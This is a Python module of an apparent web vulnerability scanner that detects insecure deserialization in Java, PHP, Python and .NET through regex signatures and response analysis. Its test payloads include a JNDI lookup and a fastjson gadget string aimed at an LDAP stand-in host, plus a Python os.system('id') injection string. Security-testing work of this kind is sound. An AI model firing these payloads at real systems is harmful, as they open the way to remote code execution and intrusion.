"""
sploit.ai - Insecure Deserialization Tester

Context-aware deserialization testing with platform-specific signatures
for Java, PHP, Python, and .NET serialization formats.
"""
import re
from typing import Tuple, Dict, List, Optional
from backend.core.vuln_engine.testers.base_tester import BaseTester


class InsecureDeserializationTester(BaseTester):
    """Tester for Insecure Deserialization (CWE-502)"""

    def __init__(self):
        super().__init__()
        self.name = "insecure_deserialization"

        # Java serialization signatures
        self._java_signatures = [
            (r"rO0AB", "Java serialized object (base64)"),
            (r"aced0005", "Java serialized object (hex)"),
            (r"org\.apache\.commons\.collections", "Commons Collections gadget chain"),
            (r"java\.lang\.Runtime", "Java Runtime class reference"),
            (r"java\.lang\.ProcessBuilder", "Java ProcessBuilder reference"),
            (r"javax\.management", "Java JMX class reference"),
            (r"com\.sun\.org\.apache\.xalan", "Xalan gadget chain"),
            (r"org\.springframework\.beans\.factory", "Spring Framework gadget"),
            (r"ObjectInputStream", "Java ObjectInputStream reference"),
        ]

        # PHP serialization signatures
        self._php_signatures = [
            (r"O:\d+:\"[A-Za-z]", "PHP serialized object"),
            (r"a:\d+:\{", "PHP serialized array"),
            (r"s:\d+:\"", "PHP serialized string"),
            (r"__wakeup", "PHP __wakeup magic method"),
            (r"__destruct", "PHP __destruct magic method"),
            (r"__toString", "PHP __toString magic method"),
            (r"POP chain", "PHP POP gadget chain"),
        ]

        # Python serialization signatures
        self._python_signatures = [
            (r"\\x80\\x04\\x95", "Python pickle v4 header"),
            (r"\\x80\\x03", "Python pickle v3 header"),
            (r"\\x80\\x02", "Python pickle v2 header"),
            (r"__reduce__", "Python pickle __reduce__ marker"),
            (r"cposix\nsystem", "Python pickle OS command"),
            (r"cos\nsystem", "Python pickle os.system"),
            (r"csubprocess\ncall", "Python pickle subprocess"),
            (r"__import__", "Python dynamic import"),
        ]

        # .NET serialization signatures
        self._dotnet_signatures = [
            (r"AAEAAAD", "\.NET BinaryFormatter (base64)"),
            (r"__type", "\.NET JSON type descriptor"),
            (r"ObjectStateFormatter", "\.NET ObjectStateFormatter"),
            (r"LosFormatter", "\.NET LosFormatter"),
            (r"System\.Windows\.Data", "\.NET gadget namespace"),
            (r"System\.Configuration\.Install", "\.NET Install gadget"),
        ]

        # ViewState signatures
        self._viewstate_signatures = [
            (r"__VIEWSTATE", "ASP\.NET ViewState parameter"),
            (r"__EVENTVALIDATION", "ASP\.NET EventValidation"),
            (r"/wEP", "ViewState (base64 prefix)"),
        ]

    def analyze_response(
        self,
        payload: str,
        response_status: int,
        response_headers: Dict,
        response_body: str,
        context: Dict
    ) -> Tuple[bool, float, Optional[str]]:
        """Analyze response for deserialization vulnerability indicators."""
        if response_status >= 500:
            # Server errors after deserialization payloads are significant
            error_indicators = [
                (r"(?i)deserializ", 0.85, "Deserialization error in 500 response"),
                (r"(?i)unserializ", 0.85, "Unserialization error in 500 response"),
                (r"(?i)unmarshal", 0.80, "Unmarshal error in 500 response"),
                (r"(?i)ClassNotFoundException", 0.90, "Java ClassNotFoundException"),
                (r"(?i)InvalidClassException", 0.90, "Java InvalidClassException"),
                (r"(?i)StreamCorruptedException", 0.85, "Java StreamCorruptedException"),
                (r"(?i)__wakeup.*failed", 0.85, "PHP __wakeup failure"),
                (r"(?i)unpickling", 0.85, "Python unpickling error"),
                (r"(?i)pickle\.loads", 0.80, "Python pickle.loads reference"),
                (r"(?i)BinaryFormatter", 0.85, "\.NET BinaryFormatter error"),
                (r"(?i)ObjectStateFormatter", 0.85, "\.NET ObjectStateFormatter error"),
                (r"(?i)ViewState.*invalid", 0.80, "ViewState validation failure"),
            ]
            for pattern, confidence, desc in error_indicators:
                if re.search(pattern, response_body):
                    return True, confidence, f"Insecure deserialization: {desc}"

            # Generic 500 with a deserialization payload is still noteworthy
            return True, 0.5, "Server error after deserialization payload"

        if response_status >= 400:
            return False, 0.0, None

        # Check for serialization markers in the response body
        all_sigs = (
            self._java_signatures
            + self._php_signatures
            + self._python_signatures
            + self._dotnet_signatures
            + self._viewstate_signatures
        )

        findings = []
        for pattern, description in all_sigs:
            if re.search(pattern, response_body):
                findings.append(description)

        if findings:
            confidence = min(0.9, 0.5 + 0.1 * len(findings))
            return True, confidence, (
                f"Serialization markers detected: {', '.join(findings[:3])}"
            )

        # Check response headers for serialization content types
        content_type = response_headers.get("content-type", "")
        if "application/x-java-serialized-object" in content_type:
            return True, 0.95, "Response Content-Type indicates Java serialization"
        if "application/x-php-serialized" in content_type:
            return True, 0.90, "Response Content-Type indicates PHP serialization"

        return False, 0.0, None

    def get_test_payloads(self) -> Dict[str, List[str]]:
        """Return platform-specific deserialization test payloads.

        Returns a dict keyed by platform (java, php, python, dotnet).
        """
        return {
            "java": [
                # Base64 Java serialized object headers (truncated, safe probes)
                "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtOE",
                "aced00057372001171657374",
                # Commons Collections gadget chain signature
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test.example.com/a"}',
                # Log4j-style JNDI (for detection, not exploitation)
                "${jndi:ldap://test.example.com/a}",
            ],
            "php": [
                'O:8:"stdClass":0:{}',
                'a:1:{s:4:"test";s:4:"test";}',
                'O:3:"Foo":1:{s:3:"bar";s:7:"phpinfo";}',
                'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}',
            ],
            "python": [
                # Safe pickle probes (do not execute commands)
                "gANdcQAoWAQAAAB0ZXN0cQFYBAAAAHRlc3RxAmUu",
                'import pickle; pickle.loads(b"test")',
                "__import__('os').system('id')",
            ],
            "dotnet": [
                # .NET BinaryFormatter probe (truncated, safe)
                "AAEAAAD/////",
                # ViewState probes
                "/wEPDwUKMTExMzI5OTc3Mg==",
                # JSON .NET type indicator
                '{"$type":"System.Object, mscorlib"}',
                # ObjectStateFormatter marker
                "/wEWAgIA",
            ],
        }
